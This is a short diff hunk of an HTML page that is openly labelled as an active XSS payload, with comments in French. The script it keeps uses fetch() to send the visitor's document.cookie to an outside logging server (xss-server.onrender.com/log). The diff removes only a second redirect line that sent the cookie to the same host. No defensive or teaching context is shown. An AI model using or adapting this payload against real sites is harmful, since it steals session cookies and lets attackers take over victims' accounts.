@@ -6,7 +6,7 @@
 <script>
   fetch("https://xss-server.onrender.com/log?cookie=" + document.cookie)
     .then(() => console.log("Cookie envoyé"));
-  location.href = "https://xss-server.onrender.com/log?cookie=" + document.cookie; 
+ 
 </script>
 <h1>XSS payload actif</h1>
 </body>
